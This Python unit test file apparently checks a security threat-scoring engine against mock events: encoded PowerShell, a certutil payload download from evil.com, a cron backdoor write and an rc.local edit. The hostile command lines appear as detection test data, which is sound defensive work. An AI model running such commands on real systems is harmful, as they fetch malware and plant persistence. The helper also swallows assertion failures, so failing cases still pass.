import sys
import os
import unittest
import logging
sys.path.append(os.getcwd())

try:
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError:
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(message)s')

class MockESClient:
    def __init__(self): self.es = None

class TestMissingCoverage(unittest.TestCase):
    def setUp(self):
        self.engine = ContextEngine(MockESClient())
        print("\n" + "="*60)

    def _verify_score(self, case_name, mock_event, expected_min_score, expected_reason_keyword):
        print(f"🧪 [测试场景] {case_name}")
        result = self.engine.evaluate_threat(mock_event)
        score = result['score']
        reasons = result['reasons']
        
        print(f"   📊 评分: {score} | 依据: {reasons}")
        
        try:
            self.assertGreaterEqual(score, expected_min_score, f"分数过低 (预期 >={expected_min_score})")
            if not any(expected_reason_keyword.lower() in r.lower() for r in reasons):
                self.fail(f"缺失关键词: '{expected_reason_keyword}'")
            print("   ✅ [PASS]")
        except AssertionError as e:
            print(f"   ❌ [FAIL] {e}")

    # --- 1. Windows 场景测试 ---
    def test_win_powershell_enc(self):
        """场景1: Windows PowerShell 编码执行 (EventID 4688)"""
        event = {
            "event": {"category": "process", "action": "process_created", "dataset": "windows"},
            "process": {
                "name": "powershell.exe",
                "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "command_line": "powershell.exe -enc aGVsbG8gd29ybGQ=" # Base64 encoded
            }
        }
        # 预期：应识别 powershell 为危险/可疑工具
        self._verify_score("Win PowerShell Encoded", event, 70, "Tool")

    def test_win_certutil_download(self):
        """场景2: Windows Certutil 下载 (Living off the Land)"""
        event = {
            "event": {"category": "process", "action": "process_created", "dataset": "windows"},
            "process": {
                "name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe"
            }
        }
        # 预期：应识别 certutil 下载行为
        self._verify_score("Win Certutil Download", event, 60, "Tool")

    # --- 2. 持久化场景测试 ---
    def test_linux_cron_persistence(self):
        """场景3: Linux Cron 持久化写入"""
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {
                "path": "/etc/cron.d/backdoor",
                "extension": ""
            },
            "process": {"name": "echo", "command_line": "echo '* * * * * root /tmp/sh' > /etc/cron.d/backdoor"}
        }
        # 预期：应识别写入 Cron 目录为敏感操作
        self._verify_score("Linux Cron Persistence", event, 70, "Sensitive")

    def test_linux_rc_local(self):
        """场景4: Linux rc.local 修改"""
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {"path": "/etc/rc.local"},
            "process": {"name": "vi", "command_line": "vi /etc/rc.local"}
        }
        # 预期：应识别修改启动项
        self._verify_score("Linux rc.local Modification", event, 70, "Sensitive")

if __name__ == '__main__':
    unittest.main(verbosity=0)
